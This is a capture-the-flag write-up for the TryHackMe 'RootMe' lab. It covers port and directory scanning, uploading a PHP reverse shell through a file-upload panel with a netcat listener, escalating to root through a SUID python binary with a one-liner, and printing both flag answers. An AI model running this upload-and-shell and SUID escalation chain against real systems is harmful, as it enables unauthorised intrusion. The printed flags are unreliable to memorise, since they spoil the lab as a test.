# Rootme 

![](https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png)

## Scanning

```bash
nmap -T4 -A -p- MACHINE_IP
Nmap scan report for MACHINE_IP
Host is up (0.15s latency).
Not shown: 65464 closed ports, 69 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Dir bruteforce:


```bash
gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
===============================================================

/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

## Explotation


* `http://MACHINE_IP/panel/``   has a file upload, i already know what im gonna do.

* Lets listen on our port `nc -lvnp 4444`, lets upload our shell `shell.phtml`

* Get a shell by: `curl http://MACHINE_IP/uploads/shell.phtml` 

* Find our flag - `find | grep "user.txt" 2>/dev/null`

## Privilege Escalation

`find / -user root -perm /4000`

```bash
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
/usr/bin/python  this one looks interesting 
```

* Since, `/usr/bin/python` has the suid bit we can promote our shell to root!

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
whoami
root

cd /root
``` 

## Flags

<details>
    <summary>user.txt</summary>

    ```bash
    THM{y0u_g0t_a_sh3l}
    ```

</details>

<details>
    <summary>root.txt</summary>

    ```bash
    THM{pr1v1l3g3_3sc4l4t10n}
    ```

</details>

## Thank You! 
